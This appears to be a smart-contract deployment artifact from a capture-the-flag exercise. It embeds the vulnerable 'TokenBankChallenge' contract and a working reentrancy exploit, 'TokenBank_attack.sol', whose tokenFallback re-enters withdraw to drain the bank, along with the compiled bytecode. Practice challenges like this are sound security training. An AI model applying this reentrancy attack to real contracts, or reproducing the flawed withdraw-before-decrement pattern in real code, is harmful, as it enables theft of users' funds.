{
  "address": "0x7b3865d32c83e5f16545c9f6b6d87533c97a7c6a",
  "abi": [
    {
      "constant": false,
      "inputs": [],
      "name": "execute",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_addr",
          "type": "address"
        }
      ],
      "name": "initCodeToCall",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "from",
          "type": "address"
        },
        {
          "name": "value",
          "type": "uint256"
        },
        {
          "name": "a",
          "type": "bytes"
        }
      ],
      "name": "tokenFallback",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "tokenaddr",
          "type": "address"
        },
        {
          "name": "transferTo",
          "type": "address"
        }
      ],
      "name": "transferToTokenBank",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "transactionHash": "0xebacb7b74c3562ab3d8b4e4c676754cd60174820b179689a104f7f712249ab38",
  "receipt": {
    "to": null,
    "from": "0xf65426ffe174e0f636a8f739d7a2196d9a44eda9",
    "contractAddress": "0x7b3865d32c83e5f16545c9f6b6d87533c97a7c6a",
    "transactionIndex": "0x9",
    "gasUsed": "0x495f9",
    "logsBloom": "0x
    "blockHash": "0x6b9f5256d8f2380397dbbd234db39aa0e5ed34ed93f2b7a0d8211c5fdba0fd50",
    "transactionHash": "0xcb36c93d06ad415d456fb600a68822c948d6ee2bee1f96cf2e19bff49a2bdf22",
    "logs": [],
    "blockNumber": "0xb96da6",
    "cumulativeGasUsed": "0x28dcfc",
    "status": "0x1"
  },
  "args": [],
  "numDeployments": 1,
  "solcInputHash": "a5105723887bdc357e6952f2dbd6eab8",
  "metadata": "{\"compiler\":{\"version\":\"0.4.21+commit.dfe3193c\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"constant\":false,\"inputs\":[],\"name\":\"execute\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_addr\",\"type\":\"address\"}],\"name\":\"initCodeToCall\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"from\",\"type\":\"address\"},{\"name\":\"value\",\"type\":\"uint256\"},{\"name\":\"a\",\"type\":\"bytes\"}],\"name\":\"tokenFallback\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"tokenaddr\",\"type\":\"address\"},{\"name\":\"transferTo\",\"type\":\"address\"}],\"name\":\"transferToTokenBank\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"methods\":{}},\"userdoc\":{\"methods\":{}}},\"settings\":{\"compilationTarget\":{\"contracts/TokenBank_attack.sol\":\"callWithdraw\"},\"evmVersion\":\"byzantium\",\"libraries\":{},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"contracts/TokenBankChallenge.sol\":{\"content\":\"pragma solidity ^0.4.21;\\n\\ninterface ITokenReceiver {\\n    function tokenFallback(\\n        address from,\\n        uint256 value,\\n        bytes data\\n    ) external;\\n}\\n\\ncontract SimpleERC223Token {\\n    // Track how many tokens are owned by each address.\\n    mapping(address => uint256) public balanceOf;\\n\\n    string public name = \\\"Simple ERC223 Token\\\";\\n    string public symbol = \\\"SET\\\";\\n    uint8 public decimals = 18;\\n\\n    uint256 public totalSupply = 1000000 * (uint256(10)**decimals);\\n\\n    event Transfer(address indexed from, address indexed to, uint256 value);\\n\\n    function SimpleERC223Token() public {\\n        balanceOf[msg.sender] = totalSupply;\\n        emit Transfer(address(0), msg.sender, totalSupply);\\n    }\\n\\n    function isContract(address _addr) private view returns (bool is_contract) {\\n        uint256 length;\\n        assembly {\\n            //retrieve the size of the code on target address, this needs assembly\\n            length := extcodesize(_addr)\\n        }\\n        return length > 0;\\n    }\\n\\n    function transfer(address to, uint256 value) public returns (bool success) {\\n        bytes memory empty;\\n        return transfer(to, value, empty);\\n    }\\n\\n    function transfer(\\n        address to,\\n        uint256 value,\\n        bytes data\\n    ) public returns (bool) {\\n        require(balanceOf[msg.sender] >= value);\\n\\n        balanceOf[msg.sender] -= value;\\n        balanceOf[to] += value;\\n        emit Transfer(msg.sender, to, value);\\n\\n        if (isContract(to)) {\\n            ITokenReceiver(to).tokenFallback(msg.sender, value, data);\\n        }\\n        return true;\\n    }\\n\\n    event Approval(\\n        address indexed owner,\\n        address indexed spender,\\n        uint256 value\\n    );\\n\\n    mapping(address => mapping(address => uint256)) public allowance;\\n\\n    function approve(address spender, uint256 value)\\n        public\\n        returns (bool success)\\n    {\\n        allowance[msg.sender][spender] = value;\\n        emit Approval(msg.sender, spender, value);\\n        return true;\\n    }\\n\\n    function transferFrom(\\n        address from,\\n        address to,\\n        uint256 value\\n    ) public returns (bool success) {\\n        require(value <= balanceOf[from]);\\n        require(value <= allowance[from][msg.sender]);\\n\\n        balanceOf[from] -= value;\\n        balanceOf[to] += value;\\n        allowance[from][msg.sender] -= value;\\n        emit Transfer(from, to, value);\\n        return true;\\n    }\\n}\\n\\ncontract TokenBankChallenge {\\n    SimpleERC223Token public token;\\n    mapping(address => uint256) public balanceOf;\\n\\n    function TokenBankChallenge(address player) public {\\n        token = new SimpleERC223Token();\\n\\n        // Divide up the 1,000,000 tokens, which are all initially assigned to\\n        // the token contract's creator (this contract).\\n        balanceOf[msg.sender] = 500000 * 10**18; // half for me\\n        balanceOf[player] = 500000 * 10**18; // half for you\\n    }\\n\\n    function isComplete() public view returns (bool) {\\n        return token.balanceOf(this) == 0;\\n    }\\n\\n    function tokenFallback(\\n        address from,\\n        uint256 value,\\n        bytes\\n    ) public {\\n        require(msg.sender == address(token));\\n        require(balanceOf[from] + value >= balanceOf[from]);\\n\\n        balanceOf[from] += value;\\n    }\\n\\n    function withdraw(uint256 amount) public {\\n        require(balanceOf[msg.sender] >= amount);\\n\\n        require(token.transfer(msg.sender, amount));\\n        balanceOf[msg.sender] -= amount;\\n    }\\n}\\n\",\"keccak256\":\"0x56eb9eeb2c6c575445d4f6ed59fd9ae63d6c3cd296830be5dda707b7963f68b0\"},\"contracts/TokenBank_attack.sol\":{\"content\":\"pragma solidity ^0.4.21;\\nimport \\\"./TokenBankChallenge.sol\\\";\\n\\ncontract callWithdraw {\\n    bool stop = false;\\n    uint256 counter = 0;\\n    TokenBankChallenge CodeToCall;\\n\\n    function initCodeToCall(address _addr) public {\\n        CodeToCall = TokenBankChallenge(address(_addr));\\n    }\\n\\n    function transferToTokenBank(address tokenaddr, address transferTo) public {\\n        SimpleERC223Token token = SimpleERC223Token(tokenaddr);\\n        // 500,000 * 10**18 = 500000000000000000000000\\n        token.transfer(transferTo, 500000000000000000000000);\\n    }\\n\\n    function execute() public {\\n        CodeToCall.withdraw(500000000000000000000000);\\n    }\\n\\n    function tokenFallback(\\n        address from,\\n        uint256 value,\\n        bytes a\\n    ) public {\\n        if (counter == 0 || counter == 2) {\\n            counter += 1;\\n        } else {\\n            counter += 1;\\n            CodeToCall.withdraw(500000000000000000000000);\\n        }\\n    }\\n}\\n\",\"keccak256\":\"0x637da8b4dbd85b6e4d3043028e1ee261c59b9e61838f382b47f5658c6b0bd829\"}},\"version\":1}",
  "bytecode": "0x606060405260008060006101000a81548160ff0219169083151502179055506000600155341561002e57600080fd5b6104698061003d6000396000f300606060405260043610610062576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680636146195414610067578063bafe040e1461007c578063c0ee0b8a146100b5578063cb01cd311461013a575b600080fd5b341561007257600080fd5b61007a610192565b005b341561008757600080fd5b6100b3600480803573ffffffffffffffffffffffffffffffffffffffff1690602001909190505061023e565b005b34156100c057600080fd5b610138600480803573ffffffffffffffffffffffffffffffffffffffff1690602001909190803590602001909190803590602001908201803590602001908080601f01602080910402602001604051908101604052809392919081815260200183838082843782019150505050505091905050610282565b005b341561014557600080fd5b610190600480803573ffffffffffffffffffffffffffffffffffffffff1690602001909190803573ffffffffffffffffffffffffffffffffffffffff1690602001909190505061036f565b005b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d6969e10de76676d08000006040518263ffffffff167c010000000000000000000000000000000000000000000000000000000002815260040180828152602001915050600060405180830381600087803b151561022c57600080fd5b5af1151561023957600080fd5b505050565b80600260006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b6000600154148061029557506002600154145b156102af576001806000828254019250508190555061036a565b60018060008282540192505081905550600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d6969e10de76676d08000006040518263ffffffff167c010000000000000000000000000000000000000000000000000000000002815260040180828152602001915050600060405180830381600087803b151561035957600080fd5b5af1151561036657600080fd5b5050505b505050565b60008290508073ffffffffffffffffffffffffffffffffffffffff1663a9059cbb836969e10de76676d08000006040518363ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200182815260200192505050602060405180830381600087803b151561042057600080fd5b5af1151561042d57600080fd5b50505060405180519050505050505600a165627a7a7230582002aeca3b965e1baf530730e4fc531298c8d8c7820c9a986665f05f6c5eb233310029",
  "deployedBytecode": "0x606060405260043610610062576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680636146195414610067578063bafe040e1461007c578063c0ee0b8a146100b5578063cb01cd311461013a575b600080fd5b341561007257600080fd5b61007a610192565b005b341561008757600080fd5b6100b3600480803573ffffffffffffffffffffffffffffffffffffffff1690602001909190505061023e565b005b34156100c057600080fd5b610138600480803573ffffffffffffffffffffffffffffffffffffffff1690602001909190803590602001909190803590602001908201803590602001908080601f01602080910402602001604051908101604052809392919081815260200183838082843782019150505050505091905050610282565b005b341561014557600080fd5b610190600480803573ffffffffffffffffffffffffffffffffffffffff1690602001909190803573ffffffffffffffffffffffffffffffffffffffff1690602001909190505061036f565b005b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d6969e10de76676d08000006040518263ffffffff167c010000000000000000000000000000000000000000000000000000000002815260040180828152602001915050600060405180830381600087803b151561022c57600080fd5b5af1151561023957600080fd5b505050565b80600260006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b6000600154148061029557506002600154145b156102af576001806000828254019250508190555061036a565b60018060008282540192505081905550600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d6969e10de76676d08000006040518263ffffffff167c010000000000000000000000000000000000000000000000000000000002815260040180828152602001915050600060405180830381600087803b151561035957600080fd5b5af1151561036657600080fd5b5050505b505050565b60008290508073ffffffffffffffffffffffffffffffffffffffff1663a9059cbb836969e10de76676d08000006040518363ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200182815260200192505050602060405180830381600087803b151561042057600080fd5b5af1151561042d57600080fd5b50505060405180519050505050505600a165627a7a7230582002aeca3b965e1baf530730e4fc531298c8d8c7820c9a986665f05f6c5eb233310029",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}